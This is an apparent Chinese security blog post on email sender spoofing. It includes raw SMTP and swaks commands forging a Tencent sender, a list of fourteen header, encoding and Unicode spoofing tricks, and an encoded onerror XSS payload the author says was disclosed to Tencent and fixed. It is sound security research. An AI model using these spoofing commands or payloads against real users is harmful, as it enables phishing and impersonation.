---
title: From email spoofing to XSS src
date: 2021-04-08 +0800
categories: [review]
tags: [vuln,xss]
---





> 这些天 清华大学网络研究院 的 论文  
>
> **Weak Links in Authentication Chains: A Large-scale Analysis of Email Sender Spoofing Attacks**
>
> 可是刷爆了我附近的 CTF 圈子 
>
> 很多朋友就是没有接触过 SMTP 或者邮件伪造的也都跃跃欲试  在复现 模仿 制作类似的 payload 
>
> > 可怜的 国内几大邮件服务提供商这几日看起来可不怎么消停
>
> 当然我也不例外 
>
> 这不 这篇文章 不就新鲜出炉了

#  如何发一封邮件

## 守序邪恶 : TELNET

伪造邮件第一步 必然是 先确定 如何发送一封邮件

这里主要介绍 现实情况的 cli (命令行处理环境下的) 发送邮件

>  有一点点上古秘籍的感觉 ( x

一般性我们喜欢使用 TELNET 或者 NETCAT 这两个工具

> 这里 <- 是来源于 服务端
>
> 同理 -> 是来自于 我们的命令行

这里以 QQ 的 SMTP 服务器作为 例子 其他的大同小异

```
$ telnet smtp.qq.com 587											这里指定了链接的服务器 smtp.qq.com 和 smtp 对应的服务端口 587 ( 465 端口好像么有了)
<-  220 newxmesmtplogicsvrsza9.qq.com XMail Esmtp QQ Mail Server. 		连接成功后会返回对应的 服务器信息
 -> EHLO mail.qq.com												第零个重要参数 这里存在 EHLO 或者 HELO 两种写法 来说明 自己来源的服务器 这里可能会受到 spf 之类的限制 这点后续会说明
<-  250-newxmesmtplogicsvrsza9.qq.com
<-  250-PIPELINING
<-  250-SIZE 73400320
<-  250-STARTTLS												    这里打开了 TLS 链接 以保证安全性
<-  250-AUTH LOGIN PLAIN XOAUTH XOAUTH2
<-  250-AUTH=LOGIN
<-  250-MAILCOMPRESS
<-  250 8BITMIME
 -> AUTH LOGIN													    AUTH LOGIN 说明我要登陆了
<-  334 VXNlcm5hbWU6												Username: 的 base64 形式
 -> [用户名的 base64 形式]
<-  334 UGFzc3dvcmQ6												Password: 的 base64 形式
 -> [密码或者授权码的 base64 形式 ]
<-  235 Authentication successful				
 -> MAIL FROM:<email 地址 支持富文本>								   第一个重要参数 mail from
<-  250 OK.														   250 表示接受 
 -> RCPT TO:<email 地址 支持富文本>								   第二个重要参数 RCPT TO
<-  250 OK
 -> DATA														   第三个参数 DATA 后面跟随 邮件的信息
<-  354 End data with <CR><LF>.<CR><LF>.							  说明结束时需要以 换行 . 换行 作为结束的标志
																  这一部分都是邮件的 headers
 -> Date: Thu, 08 Apr 2021 00:30:39 -0400							  发送时间 头 
 -> To: email地址													  第四个重要参数 To
 -> From: "=?UTF-8?B?UVHnqbrpl7Tpobnnm67nu4Q=?=" <qzone@tencent.com>	第五个重要参数 From
 -> Subject: QQ空间黄钻业务通知										  邮件标题
 -> Message-Id: <20210408003039.002038@Esonhugh>					   消息 id 
 -> X-Mailer: 126.com												自定义的 某种头 例如这里表示 邮递人是 126.com
 -> MIME-Version: 1.0												可选的头 表示 多重目的电子邮件格式
 -> Content-Type: text/html											 可选的头 内容的类型 如这里的html 
 -> Sender: <>													    第六个重要参数 Sender 头
 -> 														       邮件正文内容的开始 这里是强制空白行
 -> <html>														   邮件正文
 -> 
 -> 
 -> 																空行换行
 -> .																. 结束符 然后换行 就完成了
<-  250 OK: queued as.												 表示邮件加入队列
 -> QUIT															退出指令
<-  221 Bye.

```

这里便是 一份完整的邮件 发送的时候 

### 注意以下几个字段

id | 名称 | 作用
---|---|---
0 | EHLO [域名] | 用于向服务器标识自己 通常是 一串 域名
1 | MAIL FROM | 表示发件人的账号 支持富文本 通常可以是 " username" <sss@aaa.bbb> 
2 | RCPT TO | 表示收件人的账号 这里是必填的 
3 | DATA | 表示邮件的开始 
4 | To | 这里表示寄送的对象 其实是选填的( 
5 | From | 表示来源对象 这里一般是伪造的重灾区 
6 | Sender | 伪造的独特头 根据 sender 表示代发情况 一般性会是 默认设置为 你的 mail from 但是(有的邮箱)是可以被覆盖 

基本如上所示 明白了这些之后 就基本明白了邮件如何发送的 每一个参数又是什么

### 我的理解

> 这个人 并没有啃过 RFC 文档 所以真实性可能有所出入

为什么会发生这种事情呢? 多次输入邮件的地址 在 MALI FROM 信息 DATA / FROM 头 DATA / SENDER 头里呢

当我们在进行跨服务器通讯的时候 ( 下面是正常过程 )

也就是 我作为 126 的邮件服务器 想要尝试使用 smtp 协议传递报文到 腾讯的服务器时应该如何操作

如 user1@126.com => user2@qq.com

很简单 HELO 这里 用自己的 126.com

登陆自己所属的 专用邮箱账号 假设是 126@qq.com

来发送邮件到 对应的 账户下面 设置 mail from 为自己的专属邮箱地址 126@qq.com

然后 发送到 对应下面的 邮件 设置 Sender 为 在 126 的用户A email 地址 user1@126.com

然后 对应 from 设置 为 126 的用户A email 地址 user1@126.com

RCPT TO 写进 user2@qq.com

TO 也是同理 写入 user2@qq.com

于是就完成了一次正常的邮件转发

> 这里应该是腾讯邮箱的逻辑处理方式 但是 基本是 触类旁通的 

> 避免了 在 qq 服务器还要存储 对应的 126.com 的 user1 账户
>
> 有清晰了当 也易于 qq 和 126 两个服务器之间对于自身的账户进行管理
>
> 如果有新的 邮件服务商 进来 那么开个户就可以了
>
> 缺点也是自然很明显 导致的很严重的 邮件伪造问题

> 秒啊秒啊
>
> **此外 每一个邮件服务器关于这些的 mail from from to sender 定义每一家厂商都不一样 具体什么逻辑可能要看服务器 **



## 混沌邪恶 : SWAKS

swaks 在 kali 上本身 就有 如果你寻找不到 可以试试 apt install 

邮件伪造的神器 Swaks

方便了很多

介绍几个常用的玩法

````zsh
swaks \
--server smtp服务器域名 \
--port smtp端口 \
--ehlo EHLO声明自己 \
--au 服务器的对应账号 \
--ap 账号的授权码 \
--to RCPT_TO \
--from MAIL_FROM \
--header 'From: "=?UTF-8?B?UVHnqbrpl7Tpobnnm67nu4Q=?=" <qzone@tencent.com> 这里是 from 头' \
--add-header "MIME-Version: 1.0" \
--add-header "Content-Type: text/html" \
--header "Subject: 主题" \
--header "Sender: sender头覆盖" \
--header "X-Mailer: 126.com 自定义的 mailer " \
--body "<!DOCTYPE HTML><html>...</HTML>"
#--add-header 'From: "=?UTF-8?B?UVHnqbrpl7Tpobnnm67nu4Q=?=" <qzone@tencent.com>' 
#--add-header-From  "=?UTF-8?B?UVHnqbrpl7Tpobnnm67nu4Q=?="<qzone@tencent.com>
````

这样结合上面的知识运用一下 就有了

---

# 讲讲邮件的安全防护机制

## SPF

[SPF ( sender policy framework )](https://zh.wikipedia.org/wiki/%E5%8F%91%E4%BB%B6%E4%BA%BA%E7%AD%96%E7%95%A5%E6%A1%86%E6%9E%B6) 是 一种 txt 格式的 dns 记录 

至于查询方法嘛 ``` dig -t txt domain.name ```或者 ``` nslookup -qt=txt domain.name ```

一般性而言  SPF 记录的用途是阻止垃圾邮件发件人发送假冒您的域中的“发件人”地址的电子邮件. 收件的服务器 依靠 spf 来进行 鉴别



## DKIM

[DKIM ( Domain Key Identified Mail )](https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E5%AF%86%E9%92%A5%E8%AF%86%E5%88%AB%E9%82%AE%E4%BB%B6)  [ RFC-4871 文档 ](https://tools.ietf.org/html/rfc4871) 是 一种 让寄件人 证明自己来自该来源的作用 主要用于保护 消息邮件的完整性 以避免中间商赚差价 (偷偷改掉邮件信息) 那么假冒的邮件或篡改 邮件头部签名就会不一致

> 英文 wiki 信息更多 https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail

具体方法大致如下: 

> DKIM签名是先对内容（BODY）部分HASH，然后把这个BODY HASH放到HEADER里面，再对头部做签名。头部也不是所有字段都要签名，只有一些常用的字段，或者比较有意义的。像Received、Return-path、Bcc、Resent-bcc、DKIM-Signature、Comments、Keywords这样的字段一般不签名，FROM则是必须被签名(rfc4871 5.5 Recommended Signature Content), 最后在邮件头中增加一个DKIM-Signature头用于记录签名信息。
>
> 接收方则通过DNS查询得到公开密钥后进行验证， 验证不通过，则认为是垃圾邮件，所以DKIM不仅仅可以防止垃圾邮件，还可以防止邮件内容被篡改
>
> from: https://www.anquanke.com/post/id/86375

其中 公开密钥 获取方法和 spf 的获取方法一致 

> 我们看一下DKIM-Signature的内容：
>
> 其中，v表示DKIM的版本，
>
> a=rsa-sha1，表示算法(algorithm)。有rsa-sha1和rsa-sha256两种，
>
> c=relaxed/relaxed，表示标准化方法(Canonicalization)，头部和内容都用的relaxed方法。还可以用simple，表示不能有任何改动，包括空格.
>
> d=gmail.com，发送者的域名， 也就是Gmail收到邮件信息中的所谓的”署名域”， 这个”署名域”需要在邮件服务器的DKIM设置中配置的，可以和邮件域(比如service@mail.vpgame.net @后面的即是邮件域)不一样（一般都保持一样）
>
> s=20161025，表示域名的selector，通过这个selector，可以允许一个域名有多个public key，这样不同的server可以有不同的key。
>
> h=…，是header list，表示对HEADER中有哪些字段签名。
>
> bh=…，是body hash。也就是内容的hash。
>
> b=…，是header的签名。也就是把h=那个里面所有的字段及其值都取出来，外加DKIM-signature这个头(除了b=这个值，因为还不存在)，一起hash一下，然后用rsa加密。
>
> from: https://www.anquanke.com/post/id/86375



## DMARC

[ DMARC (Domain-based Message Authentication, Reporting & Conformance) ](https://zh.wikipedia.org/wiki/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E7%9A%84%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81%EF%BC%8C%E6%8A%A5%E5%91%8A%E5%92%8C%E4%B8%80%E8%87%B4%E6%80%A7) 是 一套以 SPF 和 DKIM 为基础的 电子邮件认证机制 

> 英文 wiki 信息更多 https://en.wikipedia.org/wiki/DMARC

> 先知 : https://xz.aliyun.com/t/6325#toc-2

# 开日! 14种伪造方案总结



> 参考 地址 https://mp.weixin.qq.com/s/tOOBZ1aC6SsjslCM70WKBQ
>
> **万恶之源**: https://www.usenix.org/system/files/sec21summer_shen-kaiwen.pdf



## 1. 第三方 STMP 的服务器 认证 用户名与 Mail From 字段可以不同

这个不用多说 直接伪装就行 所有协议全部 bypass



## 2. Mail From 头和 From 头不同

邮箱一般以显示给用户的是 Data 内的 From 头 

有些邮箱通过直接设置 From 的办法来欺骗受害者 

但是目前大部分邮箱如果 Mail From 头和 From 不一样会显示转发

当然有些邮箱使用的是 Sender 头 下面会说.



## 3. 空 Mail From 头

有些STMP服务器遇到空Mail From头可以通过 理论上按照SPF协议 

如果服务器遇到空Mail From需要去验证HELO字段 

但是由于对 HELO 字段的滥用 所以就很多服务器不根据 HELO 字段完成SPF验证  

所以碰到空 Mail From 头的判断结果就变成none



## 4. 多个From头

多个From头正常的处理方式是会被退信的 但是有一部分邮箱是只取部分显示 比如只显示第一个或只显示最后一个



## 5. From头上写多个Email地址

因为一个邮件可能被多个人编辑，所以可以在From上设置多个地址，然后设置一个 Sender 来确定真正的发件人，作为攻击者可以设置From头为
```<admin@qq.com>,<test@attack.com>``` 或者增加一些基于基本规则的变化如 ```[admin@qq.com],<test@attack.com> ```



## 6. 解析不一致产生的攻击

- Mail From和From字段都是支持富文本的。

  比如 ```<@a.com, @b.com:admin@c.com>``` 依然是合法的地址，其中 ```@a.com ```和```@b.com``` 是路由部分，```admin@c.com``` 是真正的发送者的地址

- From字段是可以设置为地址列表的，且列表种的元素可以为空，如 ```<a@a.com>,,<b@b.com>```
- 圆括号作为注释可以插入在地址中
  例子：```<admin(username)@a.com(domain)>```
- 可以用截断字符或者有意义的符号尝试截断地址



## 7. 字段编码产生的攻击

邮件本体的内容是可以被编码的，语法如下 

```
=?charset?encoding?encoded-text?=
```

charset字段为字符集 如 gbk utf-8
encoding 是编码方式 

b 代表 base64 

q 代表 Quoted-printable 编码

encoded-text就是被编码的主体了

攻击者可以设置 From 字段类似 

``` 
From: =?utf-8?b?QWxpY2VAYS5jb20=?= 
```

大多数电子邮件服务在验证DMARC协议不会去解码 所以在DMARC验证中就会得到结果None

有些Mua会把编码解码后显示出来 就造成了攻击

这种技术可以和截断字符串来联系在一起，如:

```
<b64(admin@qq.com)b64(\uffff)@attack.com> 
```

就有可能 DMARC 验证的域是 attack.com 

但是显示的是 

``` 
admin@qq.com
```



## 8. 利用Sender头进行伪造

Sender 字段定义为代发用户

不同的邮箱对 Sender 头的处理并不一样

有些会把 Sender 头作为代发

有些会直接显示出来

有时可以利用此来绕过代发显示

有些这些尽管被设置了 但是 可以再输入一下 Sender 头 然后将其覆盖掉 



## 9. 利用子域名未设置SPF

因为未设置SPF的话 SPF检测结果是none 是放行的

所以虽然 qq.com 上设置了spf 

但是 mail.qq.com 上没有设置 spf

我们就可以伪造 mail.qq.com 域下的任何用户



## 10. 利用未作验证的邮件转发服务

如果该服务器可以在不做验证的情况下任意把邮件转发到任意账户

如果该邮件转发服务器比较有名被大家信任 

接收者的MTA就会接受这份邮件 且我们的目标邮箱的域名和转发服务器邮箱的域名一样

我们就可以用这个方法来绕过 SPF 和 DMARC 但在实际操作中还是会显示代发

ATTACKER | mail | Forwarding MTA | mail | VICTIM
---|---|---|---|---
Oscar's | \ | MTA "a.com" | \ | Bob's MTA 
\ | Mail from: `<>` | \ | Mail from: `<oscar@a.com>` | \
\ | rcpt to: `<oscar@b.com>` | \ | rcpt to: `<oscar@b.com>` | \
\ | MIME.From: `<Alice@a.com>` | \ | MIME.From: `<Alice@a.com>` | \
\ | MIME.To: `<Bob@b.com>` | \ | MIME.To: `<Bob@b.com>` | \
\ | Subject: Alice's mail | \ | Subject: Alice's mail | \
\ | \ | \ | --- Automatic Forwarding ---> | \
\ | \ | \ | SPF pass a.com | \
\ | \ | \ | DMARC pass a.com | \



## 11.  利用转发服务器来骗一个合法的DKIM签名

如果我们发送的邮件没有DKIM签名

转发服务器会给我们的邮件签名

所以我们先把邮件发到转发服务器转发到另一个我们可以控制的邮箱

这样我们就收到了签名

然后我们再把这个签名附在邮件上发给被害者

我们的邮件就能拥有一个合法的DKIM签名

ATTACKER | mail | Forwarding MTA | mail | VICTIM
---|---|---|---|---
Oscar's | \ | MTA "a.com" | \ | Bob's MTA 
\ | Mail from: `<>` | \ | Mail from: `<oscar@a.com>` | \ |
\ | rcpt to: `<oscar@b.com>` | \ | rcpt to: `<oscar@b.com>` | \ |
\ | MIME.From: `<Alice@a.com>` | \ | MIME.From: `<Alice@a.com>` | \ |
\ | MIME.To: `<Bob@b.com>` | \ | MIME.To: `<Bob@b.com>` | \ | 
\ | Subject: Alice's mail | \ | Subject: Alice's mail | \ |
\ | \ | \ | --- Automatic Forwarding ---> | \ |
\ | \ | \ | SPF pass a.com | \ |
\ | \ | \ | DKIM-Signature of a.com | \ | 



## 12.  .利用IDN域名

就是利用IDN域名

找出域名看起来比较像 但实际上字母不一样的域名

[punycode在线转换工具](http://tools.jb51.net/punycode/index.php)

比如 ԛԛ.com 实际上是 xn—y7aa.com



## 13. 利用不可见字符 截断字符影响渲染结果

一些不可见字符 (U+0000-U+001F,U+FF00-U+FFFF)

语义字符(@,:,;,”)

可能会导致渲染结果出现偏差

文字中的例子一些邮箱会把```admin@gm@ail.com ```渲染成```admin@gmail.com```



## 14.  控制字符串的显示顺序来影响渲染结果

一些字符是控制字符串的显示顺序其中U+202E这个字符能让字符从右到作显示,而U+202D

让字符从左到右显示

``` 
\u202emoc.qq@\u202dadmin 
```

会被显示成 

```
admin@qq.com
```



## 总结

伪造方案 主要分为以下几类 也就是产生伪造的核心问题

- 1 - 8 利用了 邮件服务器对于 关键字段解析的差异 来进行的
- 9 域名设置的 spf 绕过
- 10  - 11 邮件转发服务获取信任
- 12 域名解析
- 13 - 14 控制字符串渲染



---

#  从 邮件伪造 到 腾讯中危 XSS SRC 

## 研究

出于 一个半吊子安全研究员的业余操守 

> 其实是听说 各大邮箱都有点 xss 就想试试 
>
> 结果没成想 还真就出了一个

这里为了省事 直接写了一个 shell 文件 调 swaks 来进行邮件伪造

> 问就是 swaks 自动化程度非常高 方便的很 交互

```bash
#!/bin/bash
swaks \
--server smtp.qq.com \
--port 587 \
--ehlo tencent.com \
--au 'qq 邮箱用户名' \
--ap 'qq 邮箱授权码' \
--to 'RCPT to 给我自己' \
--from 'mail from 我自己' \
--header 'Sender: <伪造 sender 头欺骗邮箱 可以有效阻止代发显示 可以为垃圾字符使得处理错误 但是不可以不设置>' \
--header 'From: 被伪造者' \
--header "Subject: xx 通知 " \
--add-header "MIME-Version: 1.0" \
--add-header "Content-Type: text/html" \
--body '<a href="https://en.wikipedia.org/wiki/Main_Page">link</a><div><img src="x" onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;></div>' 
```

这里  MIME-Version 和 Content-Type 是希望邮件服务器认为这封邮件是 html 格式的

> 关于 MIME ( Multipurpose Internet Mail Extensions ) 这里 给出资料链接 :
>
> https://en.wikipedia.org/wiki/MIME

然后在 --body 这里 添加 一系列 payload 

核心部分是 

```html
<img src="x" onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;>
```

这里需要将 onerror 的 js代码进行 html 编码 ( [工具链接](https://tool.oschina.net/encode/) ) 

使得 我们可以 规避 一些奇怪的问题  比如 当 ``` onerror=alert("xss") ```之时 不会执行本条代码

这时候 打开 web 端的 qq 邮箱网页 是不会有弹窗的 但是我们可以 浏览原文 

我们发现邮件本身 我们的恶意 payload 并没有被过滤掉 删改掉 

邮件本身在发送的时候也并未 reject 

相反 只是并没有正确的被解析出来 执行 罢了

我们可以大胆猜想 是否存在一个地方 或者 某种方式 当你进行阅览邮件的时候 

可以触发 这个解析 使得 xss 攻击成功

而 事实上 确实存在那么一处地方 解析是成功的

当它的窗口的真的从 内部弹出时候

到这里明白了, xss 成了

> 所以说 **允许 ** html 格式下的邮件内部运行 JavaScript 这事就离谱


## 关于扩大利用和后续研究

2. navigatior 是 premission deny 的 摄像头和GPS 权限是 premiission deny 
3. 此处 Cookie 看起来无法获取
4. 部分跳转网页有的会被拦截 有的不会 具体不太一样 ( 这里网页跳转 以及包括 含有文件下载的网页 )



## 后续

作为一个第一次挖出来漏洞 提交 src 的萌萌萌萌新来说 真是激动的不行  于是果断交了手 tsrc

由于是重要业务 ( 非核心 否则能更高 ) 被评估为了 中等威胁

买 周 边 去 咯 ! (x



## 后后续

> 2021-4-26 历经 20 天的 维修过程 
>
> 腾讯对对应的入口和方式中 进行了处理 修复了 XSS 漏洞 
>
> 与此同时 腾讯邮件服务器的软件 也被更新了 
>
> 设置了全新的 内容安全策略 基本把 之前伪造的一部分也被修复了
>



根据 TSRC 政策 去除了 对应入口的信息 

如若 对于诸位安全研究员 不能起到 一定的帮助 见谅

本文发布之时 以上 Payload 均已失效 修复完成

